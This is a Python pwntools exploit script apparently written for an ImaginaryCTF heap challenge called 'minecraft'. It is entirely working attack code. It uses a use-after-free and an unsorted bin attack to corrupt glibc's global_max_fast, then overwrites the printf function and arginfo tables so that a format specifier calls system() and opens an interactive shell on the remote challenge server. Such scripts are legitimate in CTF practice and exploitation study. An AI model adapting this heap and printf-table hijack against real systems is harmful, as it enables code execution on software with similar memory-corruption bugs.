#!/usr/bin/python3

from pwn import *

def PlaceBlock(idx, len, content):
	p.sendlineafter(b'poem\n', b'p')
	p.sendlineafter(b'idx: \n', f'{idx}'.encode())
	p.sendlineafter(b'len: \n', str(len).encode())
	p.sendafter(b'block: \n', content)

def ReplaceBlock(idx, content):
	p.sendlineafter(b'poem\n', b'r')
	p.sendlineafter(b'idx: \n', f'{idx}'.encode())
	p.sendafter(b'block: \n', content)

def BreakBlock(idx, keep):
	p.sendlineafter(b'poem\n', b'b')
	p.sendlineafter(b'idx: \n', f'{idx}'.encode())
	p.sendlineafter(b'inventory? \n', keep)

def LeakPoem(idx):
	p.sendlineafter(b'poem\n', b'l')
	p.sendlineafter(b'idx: \n', f'{idx}'.encode())

exe = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'info'

while True:
	# p = process(['gdb', exe.path])
	# p = process(exe.path)
	p = remote('minecraft.chal.imaginaryctf.org', 1337)

	def offset2size(offset):
		return offset * 2 - 0x10

	PRINTF_FUNCTABLE = 0x3f0738
	PRINTF_ARGINFO = 0x3ec870
	GLOBAL_MAX_FAST = 0x3ed940
	MAIN_ARENA = 0x3ebc40

	PlaceBlock(0, 0x500, b'0'*8)        # Use After Free
	PlaceBlock(1, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), b'1'*8)
	# prepare fake printf arginfo table
	payload = flat(
		b'\x00'*(ord('X')-2)*8,
		exe.plt['system'],
		)
	PlaceBlock(2, offset2size(PRINTF_ARGINFO - MAIN_ARENA), payload)
	PlaceBlock(3, 0x500, b'%.26739X\x00')

	# GDB()
	# unsorted bin attack
	BreakBlock(0, b'y')
	ReplaceBlock(0, b'A'*8 + p16(0x6940 - 0x10))
	try:
		PlaceBlock(0, 0x500, b'0'*8)

		# overwrite __printf_arginfo_table and __printf_function_table
		BreakBlock(1, b'n')
		BreakBlock(2, b'n')
	except:
		p.close()
		continue
	LeakPoem(3)

	p.interactive()